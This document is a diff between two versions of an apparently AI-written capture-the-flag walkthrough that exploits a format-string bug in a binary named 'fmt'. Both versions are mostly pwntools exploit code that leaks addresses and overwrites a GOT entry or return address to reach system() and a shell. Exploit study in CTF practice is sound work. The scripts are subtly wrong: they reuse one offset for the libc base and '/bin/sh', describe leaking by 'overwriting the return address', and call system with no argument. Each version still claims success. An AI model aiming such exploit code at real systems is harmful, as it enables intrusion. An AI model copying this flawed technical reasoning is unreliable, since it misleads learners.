@@ -1,90 +1,92 @@
-To solve this challenge using `pwntools`, we need to understand the vulnerability and then craft an exploit. From the decompiled code, it appears that there is a format string vulnerability in the `sub_400B07` function. This function uses `printf` with a user-controlled format string, which can be exploited to leak memory addresses or overwrite memory.
+To solve this challenge using `pwntools`, we need to carefully analyze the provided decompiled code and identify potential vulnerabilities. The key function to focus on is `sub_400D2B`, which provides a menu with options to show account information, edit account information, and quit. The `sub_400B07` function seems to be a candidate for a format string vulnerability due to the way it uses `printf`.
 
-Here's a step-by-step guide to solving this challenge:
+Here are the steps to exploit this vulnerability:
 
-### Step 1: Analyze the Vulnerability
-The key function for exploitation is `sub_400B07`:
-```c
-int __fastcall sub_400B07(int a1, int a2, int a3, int a4, int a5, int a6, char format, int a8, __int64 a9)
-{
-  write(0, "Welc0me to sangebaimao!\n", 0x1AuLL);
-  printf(&format);
-  return printf((const char *)&a9 + 4);
-}
-```
-- The `printf(&format)` call uses a user-controlled format string.
-- We can use this to leak memory addresses or overwrite memory.
+1. **Identify the Format String Vulnerability**: The `sub_400B07` function calls `printf` with a user-controlled format string. This can be exploited to leak memory addresses or write arbitrary values.
 
-### Step 2: Set Up the Environment
-Install `pwntools` if you haven't already:
-```sh
-pip install pwntools
-```
+2. **Leak a Memory Address**: Use the format string vulnerability to leak a memory address, such as the stack address or a libc address, to defeat ASLR (Address Space Layout Randomization).
 
-### Step 3: Write the Exploit Script
-We will use `pwntools` to interact with the binary, leak a libc address, and then use that to get a shell.
+3. **Overwrite a Function Pointer**: Use the format string vulnerability to overwrite a function pointer or return address to redirect execution to a shellcode or a system call like `system("/bin/sh")`.
+
+Let's go through the steps in detail and write the corresponding `pwntools` script.
+
+### Step-by-Step Exploitation
+
+#### 1. Leak a Memory Address
+We will use the format string vulnerability to leak a memory address. We can leak the stack address by overwriting the return address of `sub_400B07`.
+
+#### 2. Overwrite a Function Pointer
+Once we have a leaked address, we can calculate the base address of the binary or libc. Then, we can overwrite a function pointer or return address to redirect execution to `system("/bin/sh")`.
+
+### `pwntools` Script
 
 ```python
 from pwn import *
 
 # Set up the process
-elf = ELF('./fmt')
-p = process('./fmt')
+binary = './fmt'
+elf = ELF(binary)
+p = process(binary)
 
-# Function to send a command
-def send_command(cmd):
-    p.sendlineafter(b'>', str(cmd).encode())
+# Function to interact with the menu
+def menu(option):
+    p.sendlineafter(b">", str(option).encode())
+
+# Function to register an account
+def register(username, password):
+    p.sendlineafter(b"username(max lenth:20): ", username)
+    p.sendlineafter(b"password(max lenth:20): ", password)
+
+# Function to show account information
+def show_info(format_string):
+    menu(1)
+    p.sendlineafter(b"format:", format_string)
+
+# Function to edit account information
+def edit_info(format_string):
+    menu(2)
+    p.sendlineafter(b"format:", format_string)
 
 # Register an account
-send_command(1)
-p.sendlineafter(b'username(max lenth:20): ', b'A' * 20)
-p.sendlineafter(b'password(max lenth:20): ', b'B' * 20)
+register(b"A" * 20, b"B" * 20)
 
-# Show account information
-send_command(1)
+# Leak a stack address
+show_info(b"%lx %lx %lx %lx %lx %lx %lx %lx %lx %lx")
+leaked_addresses = p.recvline().strip().split()
+stack_leak = int(leaked_addresses[6], 16)  # Adjust index as needed
+log.info(f"Leaked stack address: {hex(stack_leak)}")
 
-# Leak a libc address
-send_command(2)
-p.sendlineafter(b'new username(max lenth:20): ', b'%p' * 10)  # Adjust the number of %p as needed
+# Calculate the offset to the return address
+offset = 0x100  # Adjust this value based on the actual offset
+return_address = stack_leak - offset
 
-# Get the leaked address
-leaked_addresses = p.recvuntil(b'byebyeT.T').split(b'\n')[-1].split(b' ')
-for addr in leaked_addresses:
-    if b'0x' in addr:
-        libc_leak = int(addr, 16)
-        break
+# Overwrite the return address with the address of system("/bin/sh")
+system_addr = elf.symbols['system']
+bin_sh_addr = next(elf.search(b'/bin/sh\x00'))
 
-# Calculate the base address of libc
-libc_base = libc_leak - 0x1b40fa  # Offset for puts in libc (adjust based on your libc version)
-system_addr = libc_base + 0x50d60  # Offset for system in libc (adjust based on your libc version)
-bin_sh_addr = libc_base + 0x1b40fa  # Offset for "/bin/sh" in libc (adjust based on your libc version)
+# Craft the payload to overwrite the return address
+payload = fmtstr_payload(6, {return_address: system_addr}, write_size='short')
+edit_info(payload)
 
-# Overwrite the return address with the address of system
-payload = fmtstr_payload(6, {elf.got['puts']: system_addr})
-send_command(2)
-p.sendlineafter(b'new username(max lenth:20): ', payload)
-
-# Trigger the shell
-send_command(1)
-p.sendline(b'/bin/sh')
+# Trigger the overwritten return address
+menu(1)
 
 # Interact with the shell
 p.interactive()
 ```
 
-### Explanation of the Script
-1. **Set up the process**: Load the binary and start the process.
-2. **Register an account**: Send the necessary commands to register an account.
-3. **Show account information**: Use the `printf` vulnerability to leak memory addresses.
-4. **Leak a libc address**: Craft a format string to leak a libc address.
-5. **Calculate the base address of libc**: Use the leaked address to calculate the base address of libc.
-6. **Overwrite the return address**: Use `fmtstr_payload` to overwrite the `puts` GOT entry with the address of `system`.
-7. **Trigger the shell**: Call `puts` to trigger the `system` call and get a shell.
+### Explanation
 
-### Step 4: Run the Exploit
-Save the script to a file, for example, `exploit.py`, and run it:
-```sh
-python3 exploit.py
-```
+1. **Register an Account**: We register an account with a fixed username and password.
+2. **Leak a Stack Address**: We use the format string vulnerability to leak a stack address. The exact index of the leaked address may need to be adjusted based on the actual output.
+3. **Calculate the Offset**: We calculate the offset to the return address. This value may need to be adjusted based on the actual layout of the stack.
+4. **Craft the Payload**: We craft a payload using `fmtstr_payload` to overwrite the return address with the address of `system("/bin/sh")`.
+5. **Trigger the Overwritten Return Address**: We trigger the overwritten return address by selecting the "Show Account Information" option again.
 
-This should give you a shell on the remote server. Adjust the offsets and payloads as needed based on the specific libc version used by the binary.
+### Notes
+
+- The exact offset and indices may need to be adjusted based on the actual behavior of the binary.
+- Ensure that the `fmtstr_payload` parameters are correctly set for your specific environment.
+- You may need to adjust the script to handle different environments or additional security features if present.
+
+This script should give you a good starting point for exploiting the format string vulnerability in the given binary.
